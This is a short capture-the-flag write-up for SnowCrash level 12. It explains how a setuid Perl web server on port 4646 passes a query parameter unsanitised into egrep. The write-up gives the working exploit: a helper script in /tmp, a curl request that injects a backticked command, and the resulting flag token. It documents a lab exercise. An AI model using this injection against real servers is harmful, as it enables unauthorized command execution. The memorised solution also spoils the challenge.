# Level 12

## Analysis

We found perl script in his home

```bash
level12@SnowCrash:~$ ll
total 16
dr-xr-x---+ 1 level12 level12  120 Mar  5  2016 ./
d--x--x--x  1 root    users    340 Aug 30  2015 ../
-r-x------  1 level12 level12  220 Apr  3  2012 .bash_logout*
-r-x------  1 level12 level12 3518 Aug 30  2015 .bashrc*
-rwsr-sr-x+ 1 flag12  level12  464 Mar  5  2016 level12.pl*
-r-x------  1 level12 level12  675 Apr  3  2012 .profile*
```

We understood from script that one server is listening on port 4646 and taking 2 arguments from url query params. When it recieve request, the server perform `egrep` search with one of url query param. `egrep` is vulnerable from input sended by unknown client. We perform an script injection with url query param that will execute local script on server.

```bash
cat << EOF > /tmp/GETFLAG
#!/bin/bash
getflag > /tmp/flag
EOF
chmod +x /tmp/GETFLAG
```

Then call server hosted with the injection:
```bash
curl 'http://localhost:4646/?x=`/*/getflag`'
cat /tmp/flag
Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
```
